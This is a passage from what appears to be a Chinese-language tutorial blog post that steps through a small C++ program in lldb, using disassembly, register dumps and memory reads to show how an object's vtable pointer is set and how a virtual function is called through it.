0x10f14cfa6: add    rsp, 0x30</span><br><span class="line">    0x10f14cfaa: pop    rbp</span><br><span class="line">    0x10f14cfab: ret    </span><br><span class="line">    0x10f14cfac: nop    dword ptr [rax]</span><br><span class="line">(lldb) memory read/20xg 0x00007ffc32402e20</span><br><span class="line">0x7ffc32402e20: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e30: 0x00007ffc32400600 0x0000000000000000</span><br><span class="line">0x7ffc32402e40: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e50: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e60: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e70: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e80: 0x00007fff51894984 0x00007fff7dbbdef0</span><br><span class="line">0x7ffc32402e90: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402ea0: 0x00007fff7d975772 0x00007fff7d943fc5</span><br><span class="line">0x7ffc32402eb0: 0x00007fff4fbb35eb 0x00007fff7c1b76e3</span><br></pre></td></tr></table></figure><p>对象指针里面一片空白，跟进到这个call完</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis</span><br><span class="line">main @ virtual_function:</span><br><span class="line">    0x10f14cf40: push   rbp</span><br><span class="line">    0x10f14cf41: mov    rbp, rsp</span><br><span class="line">    0x10f14cf44: sub    rsp, 0x30</span><br><span class="line">    0x10f14cf48: mov    dword ptr [rbp - 0x4], 0x0</span><br><span class="line">    0x10f14cf4f: mov    dword ptr [rbp - 0x8], edi</span><br><span class="line">    0x10f14cf52: mov    qword ptr [rbp - 0x10], rsi</span><br><span class="line">    0x10f14cf56: mov    edi, 0x10</span><br><span class="line">    0x10f14cf5b: call   0x10f14dd8e               ; symbol stub for: operator new(unsigned long)</span><br><span class="line">    0x10f14cf60: xor    esi, esi</span><br><span class="line">    0x10f14cf62: mov    rdi, rax</span><br><span class="line">    0x10f14cf65: mov    edx, 0x10</span><br><span class="line">    0x10f14cf6a: mov    qword ptr [rbp - 0x20], rax</span><br><span class="line">    0x10f14cf6e: call   0x10f14dda0               ; symbol stub for: memset</span><br><span class="line">    0x10f14cf73: mov    rdi, qword ptr [rbp - 0x20]</span><br><span class="line">    0x10f14cf77: call   0x10f14cfb0               ; SonClass::SonClass at main.cpp:24</span><br><span class="line"><span class="meta">-&gt;</span>  0x10f14cf7c: mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">    0x10f14cf80: mov    qword ptr [rbp - 0x18], rax</span><br><span class="line">    0x10f14cf84: mov    rdi, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf88: call   0x10f14cef0               ; letClassSaySomething at main.cpp:38</span><br><span class="line">    0x10f14cf8d: mov    rsi, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf91: lea    rdi, [rip + 0xf4c]        ; "%p\n"</span><br><span class="line">    0x10f14cf98: mov    al, 0x0</span><br><span class="line">    0x10f14cf9a: call   0x10f14dda6               ; symbol stub for: printf</span><br><span class="line">    0x10f14cf9f: xor    ecx, ecx</span><br><span class="line">    0x10f14cfa1: mov    dword ptr [rbp - 0x24], eax</span><br><span class="line">    0x10f14cfa4: mov    eax, ecx</span><br><span class="line">    0x10f14cfa6: add    rsp, 0x30</span><br><span class="line">    0x10f14cfaa: pop    rbp</span><br><span class="line">    0x10f14cfab: ret    </span><br><span class="line">    0x10f14cfac: nop    dword ptr [rax]</span><br><span class="line">(lldb) memory read/20xg 0x00007ffc32402e20</span><br><span class="line">0x7ffc32402e20: 0x000000010f14e118 0x000000010f14e138</span><br><span class="line">0x7ffc32402e30: 0x00007ffc32400600 0x0000000000000000</span><br><span class="line">0x7ffc32402e40: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e50: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e60: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e70: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e80: 0x00007fff51894984 0x00007fff7dbbdef0</span><br><span class="line">0x7ffc32402e90: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402ea0: 0x00007fff7d975772 0x00007fff7d943fc5</span><br><span class="line">0x7ffc32402eb0: 0x00007fff4fbb35eb 0x00007fff7c1b76e3</span><br><span class="line">(lldb) register read</span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = 0x000000010f14e118  virtual_function`vtable for SonClass + 16</span><br><span class="line">       rbx = 0x0000000000000000</span><br><span class="line">       rcx = 0x00007ffc32402e20</span><br><span class="line">       rdx = 0x0000000000000000</span><br><span class="line">       rdi = 0x000000010f14e138  virtual_function`vtable for SonClass + 48</span><br><span class="line">       rsi = 0x0000000000000000</span><br><span class="line">       rbp = 0x00007ffee0ab3720</span><br><span class="line">       rsp = 0x00007ffee0ab36f0</span><br><span class="line">        r8 = 0x000000000000000f</span><br><span class="line">        r9 = 0x00007ffc32400360</span><br><span class="line">       r10 = 0x00007ffee0ab3870</span><br><span class="line">       r11 = 0x00007fff7db798e0  libsystem_platform.dylib`_platform_memset$VARIANT$Haswell</span><br><span class="line">       r12 = 0x0000000000000000</span><br><span class="line">       r13 = 0x0000000000000000</span><br><span class="line">       r14 = 0x0000000000000000</span><br><span class="line">       r15 = 0x0000000000000000</span><br><span class="line">       rip = 0x000000010f14cf7c  virtual_function`main + 60 at main.cpp:46</span><br><span class="line">    rflags = 0x0000000000000202</span><br><span class="line">        cs = 0x000000000000002b</span><br><span class="line">        fs = 0x0000000000000000</span><br><span class="line">        gs = 0x0000000000000000</span><br></pre></td></tr></table></figure><p>首先，我们已经明确了这个函数并没有返回值，所以根本不存在rax是返回值这个说法<br>顶多算作函数内部使用了rax而没有恢复寄存器到调用前的状态<br>而执行了这个call之后，对象指针中出现了另一个指针，这个指针按照之前的静态分析，应该就是虚表指针<br>那么我们直接跟进到调用letClassSaySomething函数前，查看其寄存器观察参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis</span><br><span class="line">main @ virtual_function:</span><br><span class="line">    0x10f14cf40: push   rbp</span><br><span class="line">    0x10f14cf41: mov    rbp, rsp</span><br><span class="line">    0x10f14cf44: sub    rsp, 0x30</span><br><span class="line">    0x10f14cf48: mov    dword ptr [rbp - 0x4], 0x0</span><br><span class="line">    0x10f14cf4f: mov    dword ptr [rbp - 0x8], edi</span><br><span class="line">    0x10f14cf52: mov    qword ptr [rbp - 0x10], rsi</span><br><span class="line">    0x10f14cf56: mov    edi, 0x10</span><br><span class="line">    0x10f14cf5b: call   0x10f14dd8e               ; symbol stub for: operator new(unsigned long)</span><br><span class="line">    0x10f14cf60: xor    esi, esi</span><br><span class="line">    0x10f14cf62: mov    rdi, rax</span><br><span class="line">    0x10f14cf65: mov    edx, 0x10</span><br><span class="line">    0x10f14cf6a: mov    qword ptr [rbp - 0x20], rax</span><br><span class="line">    0x10f14cf6e: call   0x10f14dda0               ; symbol stub for: memset</span><br><span class="line">    0x10f14cf73: mov    rdi, qword ptr [rbp - 0x20]</span><br><span class="line">    0x10f14cf77: call   0x10f14cfb0               ; SonClass::SonClass at main.cpp:24</span><br><span class="line">    0x10f14cf7c: mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">    0x10f14cf80: mov    qword ptr [rbp - 0x18], rax</span><br><span class="line">    0x10f14cf84: mov    rdi, qword ptr [rbp - 0x18]</span><br><span class="line"><span class="meta">-&gt;</span>  0x10f14cf88: call   0x10f14cef0               ; letClassSaySomething at main.cpp:38</span><br><span class="line">    0x10f14cf8d: mov    rsi, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf91: lea    rdi, [rip + 0xf4c]        ; "%p\n"</span><br><span class="line">    0x10f14cf98: mov    al, 0x0</span><br><span class="line">    0x10f14cf9a: call   0x10f14dda6               ; symbol stub for: printf</span><br><span class="line">    0x10f14cf9f: xor    ecx, ecx</span><br><span class="line">    0x10f14cfa1: mov    dword ptr [rbp - 0x24], eax</span><br><span class="line">    0x10f14cfa4: mov    eax, ecx</span><br><span class="line">    0x10f14cfa6: add    rsp, 0x30</span><br><span class="line">    0x10f14cfaa: pop    rbp</span><br><span class="line">    0x10f14cfab: ret    </span><br><span class="line">    0x10f14cfac: nop    dword ptr [rax]</span><br><span class="line">(lldb) register read</span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = 0x00007ffc32402e20</span><br><span class="line">       rbx = 0x0000000000000000</span><br><span class="line">       rcx = 0x00007ffc32402e20</span><br><span class="line">       rdx = 0x0000000000000000</span><br><span class="line">       rdi = 0x00007ffc32402e20</span><br><span class="line">       rsi = 0x0000000000000000</span><br><span class="line">       rbp = 0x00007ffee0ab3720</span><br><span class="line">       rsp = 0x00007ffee0ab36f0</span><br><span class="line">        r8 = 0x000000000000000f</span><br><span class="line">        r9 = 0x00007ffc32400360</span><br><span class="line">       r10 = 0x00007ffee0ab3870</span><br><span class="line">       r11 = 0x00007fff7db798e0  libsystem_platform.dylib`_platform_memset$VARIANT$Haswell</span><br><span class="line">       r12 = 0x0000000000000000</span><br><span class="line">       r13 = 0x0000000000000000</span><br><span class="line">       r14 = 0x0000000000000000</span><br><span class="line">       r15 = 0x0000000000000000</span><br><span class="line">       rip = 0x000000010f14cf88  virtual_function`main + 72 at main.cpp:47</span><br><span class="line">    rflags = 0x0000000000000202</span><br><span class="line">        cs = 0x000000000000002b</span><br><span class="line">        fs = 0x0000000000000000</span><br><span class="line">        gs = 0x0000000000000000</span><br></pre></td></tr></table></figure><p>这里已经可以证明刚才new之后的返回值是指向对象的指针<br>那么我还想看到虚函数是怎么被调用的，我步进这个函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis</span><br><span class="line">letClassSaySomething @ virtual_function:</span><br><span class="line"><span class="meta">-&gt;</span>  0x10f14cef0: push   rbp</span><br><span class="line">    0x10f14cef1: mov    rbp, rsp</span><br><span class="line">    0x10f14cef4: sub    rsp, 0x20</span><br><span class="line">    0x10f14cef8: mov    qword ptr [rbp - 0x8], rdi</span><br><span class="line">    0x10f14cefc: mov    rdi, qword ptr [rbp - 0x8]</span><br><span class="line">    0x10f14cf00: mov    rax, qword ptr [rdi]</span><br><span class="line">    0x10f14cf03: call   qword ptr [rax]</span><br><span class="line">    0x10f14cf05: mov    rax, qword ptr [rbp - 0x8]</span><br><span class="line">    0x10f14cf09: mov    rdi, qword ptr [rax]</span><br><span class="line">    0x10f14cf0c: mov    qword ptr [rbp - 0x10], rdi</span><br><span class="line">    0x10f14cf10: mov    rdi, rax</span><br><span class="line">    0x10f14cf13: mov    rax, qword ptr [rbp - 0x10]</span><br><span class="line">    0x10f14cf17: call   qword ptr [rax + 0x8]</span><br><span class="line">    0x10f14cf1a: mov    rax, qword ptr [rbp - 0x8]</span><br><span class="line">    0x10f14cf1e: cmp    rax, 0x0</span><br><span class="line">    0x10f14cf22: mov    qword ptr [rbp - 0x18], rax</span><br><span class="line">    0x10f14cf26: je     0x10f14cf38               ; &lt;+72&gt; at main.cpp:42</span><br><span class="line">    0x10f14cf2c: mov    rax, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf30: mov    rdi, rax</span><br><span class="line">    0x10f14cf33: call   0x10f14dd88               ; symbol stub for: operator delete(void*)</span><br><span class="line">    0x10f14cf38: add    rsp, 0x20</span><br><span class="line">    0x10f14cf3c: pop    rbp</span><br><span class="line">    0x10f14cf3d: ret    </span><br><span class="line">    0x10f14cf3e: nop</span><br></pre></td></tr></table></figure><p>和刚才静态分析的几乎没有偏差，主要分析一下最后一条mov指令<br>mov    rax, qword ptr [rdi]<br>//rdi中存放着对象指针<br>//对象指针指向的内存中存放的应该又是另一个指针(虚表指针)<br>我们跟进到最后一条mov之前：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis</span><br><span class="line">letClassSaySomething @ virtual_function:</span><br><span class="line">    0x10f14cef0: push   rbp</span><br><span class="line">    0x10f14cef1: mov    rbp, rsp</span><br><span class="line">    0x10f14cef4: sub    rsp, 0x20</span><br><span class="line">    0x10f14cef8: mov    qword ptr [rbp - 0x8], rdi</span><br><span class="line">    0x10f14cefc: mov    rdi, qword ptr [rbp - 0x8]</span><br><span class="line"><span class="meta">-&gt;</span>  0x10f14cf00: mov    rax, qword ptr [rdi]</span><br><span class="line">    0x10f14cf03: call   qword ptr [rax]</span><br><span class="line">    0x10f14cf05: mov    rax, qword ptr [rbp - 0x8]</span><br><span class="line">    0x10f14cf09: mov    rdi, qword ptr [rax]</span><br><span class="line">    0x10f14cf0c: mov    qword ptr [rbp - 0x10], rdi</span><br><span class="line">    0x10f14cf10: mov    rdi, rax</span><br><span class="line">    0x10f14cf13: mov    rax, qword ptr [rbp - 0x10]</span><br><span class="line">    0x10f14cf17: call   qword ptr [rax + 0x8]</span><br><span class="line">    0x10f14cf1a: mov    rax, qword ptr [rbp - 0x8]</span><br><span class="line">    0x10f14cf1e: cmp    rax, 0x0</span><br><span class="line">    0x10f14cf22: mov    qword ptr [rbp - 0x18], rax</span><br><span class="line">    0x10f14cf26: je     0x10f14cf38               ; &lt;+72&gt; at main.cpp:42</span><br><span class="line">    0x10f14cf2c: mov    rax, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf30: mov    rdi, rax</span><br><span class="line">    0x10f14cf33: call   0x10f14dd88               ; symbol stub for: operator delete(void*)</span><br><span class="line">    0x10f14cf38: add    rsp, 0x20</span><br><span class="line">    0x10f14cf3c: pop    rbp</span><br><span class="line">    0x10f14cf3d: ret    </span><br><span class="line">    0x10f14cf3e: nop    </span><br><span class="line">(lldb) register read</span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = 0x00007ffc32402e20</span><br><span class="line">       rbx = 0x0000000000000000</span><br><span class="line">       rcx = 0x00007ffc32402e20</span><br><span class="line">       rdx = 0x0000000000000000</span><br><span class="line">       rdi = 0x00007ffc32402e20</span><br><span class="line">       rsi = 0x0000000000000000</span><br><span class="line">       rbp = 0x00007ffee0ab36e0</span><br><span class="line">       rsp = 0x00007ffee0ab36c0</span><br><span class="line">        r8 = 0x000000000000000f</span><br><span class="line">        r9 = 0x00007ffc32400360</span><br><span class="line">       r10 = 0x00007ffee0ab3870</span><br><span class="line">       r11 = 0x00007fff7db798e0  libsystem_platform.dylib\`_platform_memset$VARIANT$Haswell</span><br><span class="line">       r12 = 0x0000000000000000</span><br><span class="line">       r13 = 0x0000000000000000</span><br><span class="line">       r14 = 0x0000000000000000</span><br><span class="line">       r15 = 0x0000000000000000</span><br><span class="line">       rip = 0x000000010f14cf00  virtual_function\`letClassSaySomething(SonClass*) + 16 at main.cpp:39</span><br><span class="line">    rflags = 0x0000000000000206</span><br><span class="line">        cs = 0x000000000000002b</span><br><span class="line">        fs = 0x0000000000000000</span><br><span class="line">        gs = 0x0000000000000000</span><br></pre></td></tr></table></figure><p>rdi是对象指针，我们先来看看对象指针中的值进行分析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read/20xg 0x00007ffc32402e20</span><br><span class="line">0x7ffc32402e20: 0x000000010f14e118 0x000000010f14e138</span><br><span class="line">0x7ffc32402e30: 0x00007ffc32400600 0x0000000000000000</span><br><span class="line">0x7ffc32402e40: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e50: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e60: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e70: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402e80: 0x00007fff51894984 0x00007fff7dbbdef0</span><br><span class="line">0x7ffc32402e90: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7ffc32402ea0: 0x00007fff7d975772 0x00007fff7d943fc5</span><br><span class="line">0x7ffc32402eb0: 0x00007fff4fbb35eb 0x00007fff7c1b76e3</span><br><span class="line">(lldb) memory read/20xg 0x000000010f14e118</span><br><span class="line">0x10f14e118: 0x000000010f14d070 0x000000010f14d0b0</span><br><span class="line">0x10f14e128: 0xfffffffffffffff8 0x000000010f14e160</span><br><span class="line">0x10f14e138: 0x000000010f14d0f0 0x00007fffb396bcb8</span><br><span class="line">0x10f14e148: 0x000000010f14df47 0x00007fffb396bcb8</span><br><span class="line">0x10f14e158: 0x000000010f14df52 0x00007fffb396bd98</span><br><span class="line">0x10f14e168: 0x000000010f14df3d 0x0000000200000000</span><br><span class="line">0x10f14e178: 0x000000010f14e140 0x0000000000000002</span><br><span class="line">0x10f14e188: 0x000000010f14e150 0x0000000000000802</span><br><span class="line">0x10f14e198: 0x0000000000000000 0x000000010f14e140</span><br><span class="line">0x10f14e1a8: 0x000000010f14d110 0x0000000000000000</span><br></pre></td></tr></table></figure><p>那么可以明确，rax的值就是虚表指针，指向一个虚表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis</span><br><span class="line">letClassSaySomething @ virtual_function:</span><br><span class="line">    0x10f14cef0: push   rbp</span><br><span class="line">    0x10f14cef1: mov    rbp, rsp</span><br><span class="line">    0x10f14cef4: sub    rsp, 0x20</span><br><span class="line">    0x10f14cef8: mov    qword ptr [rbp - 0x8], rdi</span><br><span class="line">    0x10f14cefc: mov    rdi, qword ptr [rbp - 0x8]</span><br><span class="line"><span class="meta">-&gt;</span>  0x10f14cf00: mov    rax, qword ptr [rdi]</span><br><span class="line">    0x10f14cf03: call   qword ptr [rax]</span><br><span class="line">    0x10f14cf05: mov    rax, qword ptr [rbp - 0x8]</span><br><span class="line">    0x10f14cf09: mov    rdi, qword ptr [rax]</span><br><span class="line">    0x10f14cf0c: mov    qword ptr [rbp - 0x10], rdi</span><br><span class="line">    0x10f14cf10: mov    rdi, rax</span><br><span class="line">    0x10f14cf13: mov    rax, qword ptr [rbp - 0x10]</span><br><span class="line">    0x10f14cf17: call   qword ptr [rax + 0x8]</span><br><span class="line">    0x10f14cf1a: mov    rax, qword ptr [rbp - 0x8]</span><br><span class="line">    0x10f14cf1e: cmp    rax, 0x0</span><br><span class="line">    0x10f14cf22: mov    qword ptr [rbp - 0x18], rax</span><br><span class="line">    0x10f14cf26: je     0x10f14cf38               ; &lt;+72&gt; at main.cpp:42</span><br><span class="line">    0x10f14cf2c: mov    rax, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf30: mov    rdi, rax</span><br><span class="line">    0x10f14cf33: call   0x10f14dd88               ; symbol stub for: operator delete(void*)</span><br><span class="line">    0x10f14cf38: add    rsp, 0x20</span><br><span class="line">    0x10f14cf3c: pop    rbp</span><br><span class="line">    0x10f14cf3d: ret    </span><br><span class="line">    0x10f14cf3e: nop    </span><br><span class="line">(lldb) ni</span><br><span class="line">(lldb) register read</span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = 0x000000010f14e118  virtual_function\`vtable for SonClass + 16</span><br><span class="line">       rbx = 0x0000000000000000</span><br><span class="line">       rcx = 0x00007ffc32402e20</span><br><span class="line">       rdx = 0x0000000000000000</span><br><span class="line">       rdi = 0x00007ffc32402e20</span><br><span class="line">       rsi = 0x0000000000000000</span><br><span class="line">       rbp = 0x00007ffee0ab36e0</span><br><span class="line">       rsp = 0x00007ffee0ab36c0</span><br><span class="line">        r8 = 0x000000000000000f</span><br><span class="line">        r9 = 0x00007ffc32400360</span><br><span class="line">       r10 = 0x00007ffee0ab3870</span><br><span class="line">       r11 = 0x00007fff7db798e0  libsystem_platform.dylib\`_platform_memset$VARIANT$Haswell</span><br><span class="line">       r12 = 0x0000000000000000</span><br><span class="line">       r13 = 0x0000000000000000</span><br><span class="line">       r14 = 0x0000000000000000</span><br><span class="line">       r15 = 0x0000000000000000</span><br><span class="line">       rip = 0x000000010f14cf03  virtual_function letClassSaySomething(SonClass*) + 19 at main.cpp:39</span><br><span class="line">    rflags = 0x0000000000000206</span><br><span class="line">        cs = 0x000000000000002b</span><br><span class="line">        fs = 0x0000000000000000</span><br><span class="line">        gs = 0x0000000000000000</span><br></pre></td></tr></table></figure><p>然而最终是对虚表指针所指向的内存中的值(虚表内容)进行调用<br>那么虚表指针所指向的内存中的值也是一堆指针，我们先去看看这些指针指向的内存是否为代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read/20xg 0x000000010f14e118</span><br><span class="line">0x10f14e118: 0x000000010f14d070 0x000000010f14d0b0</span><br><span class="line">0x10f14e128: 0xfffffffffffffff8 0x000000010f14e160</span><br><span class="line">0x10f14e138: 0x000000010f14d0f0 0x00007fffb396bcb8</span><br><span class="line">0x10f14e148: 0x000000010f14df47 0x00007fffb396bcb8</span><br><span class="line">0x10f14e158: 0x000000010f14df52 0x00007fffb396bd98</span><br><span class="line">0x10f14e168: 0x000000010f14df3d 0x0000000200000000</span><br><span class="line">0x10f14e178: 0x000000010f14e140 0x0000000000000002</span><br><span class="line">0x10f14e188: 0x000000010f14e150 0x0000000000000802</span><br><span class="line">0x10f14e198: 0x0000000000000000 0x000000010f14e140</span><br><span class="line">0x10f14e1a8: 0x000000010f14d110 0x0000000000000000</span><br><span class="line">(lldb) x/20i 0x000000010f14d070</span><br><span class="line">    0x10f14d070: 55                    push   rbp</span><br><span class="line">    0x10f14d071: 48 89 e5              mov    rbp, rsp</span><br><span class="line">    0x10f14d074: 48 83 ec 10           sub    rsp, 0x10</span><br><span class="line">    0x10f14d078: 48 8b 05 89 0f 00 00  mov    rax, qword ptr [rip + 0xf89] ; (void *)0x00007fffb3966770: std::__1::cout</span><br><span class="line">    0x10f14d07f: 48 89 7d f8           mov    qword ptr [rbp - 0x8], rdi</span><br><span class="line">    0x10f14d083: 48 89 c7              mov    rdi, rax</span><br><span class="line">    0x10f14d086: 48 8d 35 85 0e 00 00  lea    rsi, [rip + 0xe85]        ; "I'm SonClass::say()."</span><br><span class="line">    0x10f14d08d: e8 ea 0c 00 00        call   0x10f14dd7c               ; symbol stub for: std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp; std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt; &gt;(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp;, char const*)</span><br><span class="line">    0x10f14d092: 48 89 c7              mov    rdi, rax</span><br><span class="line">    0x10f14d095: 48 8d 35 24 01 00 00  lea    rsi, [rip + 0x124]        ; std::__1::endl&lt;char, std::__1::char_traits&lt;char&gt; &gt; at ostream:1001</span><br><span class="line">    0x10f14d09c: e8 ff 00 00 00        call   0x10f14d1a0               </span><br><span class="line">    0x10f14d0a1: 48 89 45 f0           mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">    0x10f14d0a5: 48 83 c4 10           add    rsp, 0x10</span><br><span class="line">    0x10f14d0a9: 5d                    pop    rbp</span><br><span class="line">    0x10f14d0aa: c3                    ret    </span><br><span class="line">    0x10f14d0ab: 